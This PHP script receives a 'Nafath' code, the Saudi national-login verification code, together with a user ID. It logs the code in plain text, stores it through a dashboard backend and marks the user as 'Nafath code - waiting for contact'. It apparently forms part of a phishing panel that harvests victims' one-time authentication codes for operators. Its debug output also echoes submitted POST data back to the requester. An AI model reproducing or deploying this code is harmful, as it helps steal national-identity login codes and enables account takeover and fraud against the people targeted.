<?php
session_start();
require_once('../dashboard/init.php');

error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'METHOD_NOT_ALLOWED']);
    exit;
}

// ✅ استقبال user_id
$userId = $_POST['client_id'] ?? $_POST['user_id'] ?? $_SESSION['current_user_id'] ?? $_SESSION['client_id'] ?? null;

if (!$userId) {
    error_log("❌ No user ID found");
    http_response_code(400);
    echo json_encode([
        'success' => false, 
        'error' => 'NO_USER_ID',
        'debug' => [
            'post' => $_POST,
            'session' => [
                'current_user_id' => $_SESSION['current_user_id'] ?? 'not set',
                'client_id' => $_SESSION['client_id'] ?? 'not set'
            ]
        ]
    ]);
    exit;
}

// ✅ استقبال رمز نفاذ
$nafadCode = $_POST['nafad_code'] ?? $_POST['otp_second'] ?? '';

if (empty($nafadCode)) {
    error_log("❌ No nafad code provided");
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'NO_NAFAD_CODE']);
    exit;
}

// ✅ تنظيف الكود
$nafadCode = preg_replace('/\D/', '', $nafadCode);

if (strlen($nafadCode) < 4 || strlen($nafadCode) > 6) {
    error_log("❌ Invalid code length: " . strlen($nafadCode));
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'INVALID_CODE_LENGTH']);
    exit;
}

error_log("📥 Processing nafad code - User: $userId, Code: $nafadCode");

// ✅ حفظ رمز نفاذ
try {
    $saved = $User->insertNafadCode($userId, $nafadCode);
    
    // ✅ التحقق الصحيح: إذا أرجعت false أو 0 أو null
    if ($saved === false || $saved === 0 || $saved === null) {
        error_log("❌ insertNafadCode failed - returned: " . var_export($saved, true));
        
        http_response_code(500);
        echo json_encode([
            'success' => false, 
            'error' => 'SAVE_FAILED',
            'debug' => [
                'user_id' => $userId,
                'code' => $nafadCode,
                'returned_value' => $saved
            ]
        ]);
        exit;
    }
    
    error_log("✅ Nafad code saved successfully. ID: $saved");
    
} catch (Exception $e) {
    error_log("❌ Exception: " . $e->getMessage());
    error_log("Stack trace: " . $e->getTraceAsString());
    
    http_response_code(500);
    echo json_encode([
        'success' => false, 
        'error' => 'EXCEPTION',
        'message' => $e->getMessage()
    ]);
    exit;
}

// ✅ تحديث رسالة المستخدم
try {
    $User->updateUserMessage($userId, 'رمز نفاذ - انتظار الاتصال');
    error_log("✅ User message updated");
} catch (Exception $e) {
    error_log("⚠️ Failed to update message: " . $e->getMessage());
}

// ✅ رد ناجح
echo json_encode([
    'success' => true,
    'ok' => true,
    'message' => 'تم الحفظ بنجاح',
    'user_id' => $userId,
    'code_id' => $saved
]);
exit;